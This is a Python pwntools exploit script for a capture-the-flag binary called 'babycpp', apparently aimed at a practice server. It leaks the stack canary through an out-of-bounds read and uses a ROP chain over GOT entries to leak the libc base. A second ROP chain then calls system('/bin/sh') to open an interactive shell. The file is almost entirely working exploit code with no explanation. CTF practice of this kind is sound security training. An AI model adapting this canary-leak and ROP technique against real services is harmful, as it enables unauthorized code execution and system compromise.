#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
# context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
context.binary = './babycpp'
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    if local == 0:
        return
    binaryname = str(context.binary).split('/')[-1].replace("')", '')
    interruptPoint=[0xe97, 0xf73]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[-1])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

local = 0
elf = ELF('./babycpp')
prdi = 0x401253
prsir15 = 0x401251

if local:
    io = process('./babycpp')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so') 

else:
    io = remote('node3.buuoj.cn', 27288)
    libc = ELF('../libc-2.27-x64.so')

def setn(n):
    io.sendlineafter('> ', '1')
    io.sendline(str(n))

def x64to32(val):
    return [u32(p64(val)[0:4]), u32(p64(val)[4:8])]

if __name__ == '__main__':
    io.sendlineafter('n:\n', '20')
    
    io.sendlineafter('> ', '2')
    for i in range(20):
        io.sendline('1')

    setn(25)
    io.sendlineafter('> ', '3')
    canary = []
    io.recvuntil(' ')
    io.recvuntil(' ')
    io.recvuntil(' ')
    canary.append(int(io.recvuntil(' ', drop = True)))
    canary.append(int(io.recvuntil(' ', drop = True)))
    print '[+]', canary

    payload = []
    for i in range(22):
        payload.append(i)
    payload += canary 

    payload.append(22)
    payload.append(23)

    
    # payload += [prdi, 0x602200, prsir15, elf.got['alarm'], elf.got['setbuf']]
    payload += x64to32(prdi) + x64to32(0x602200)
    payload += x64to32(prsir15) + x64to32(elf.got['alarm']) + x64to32(elf.got['setbuf'])
    payload += x64to32(0x400ab0) + x64to32(elf.sym['main'])
    # payload += [0x400a50, elf.sym['main']]

    debug()
    setn(len(payload))
    io.sendlineafter('> ', '2')
    io.recvuntil('num:\n')
    for i in range(len(payload)):
        io.sendline(str(payload[i]))

    io.sendlineafter('> ', '4')
    libcbase = u64(io.recvuntil('\x7f').ljust(8, '\x00')) - libc.sym['alarm']
    success('libcbase', libcbase)
    libc.address = libcbase


    # second loop
    
    payload = []
    for i in range(22):
        payload.append(i)
    payload += canary 

    payload.append(22)
    payload.append(23)
    payload += x64to32(prdi) + x64to32(libc.search('/bin/sh').next())
    payload += x64to32(libc.sym['system']) + x64to32(elf.sym['main'])
    
    io.sendlineafter('n:\n', str(len(payload)))
    io.sendlineafter('> ', '2')
    io.recvuntil('num:\n')
    for i in range(len(payload)):
        io.sendline(str(payload[i]))

    io.sendlineafter('> ', '4')

    io.interactive()
    io.close()    

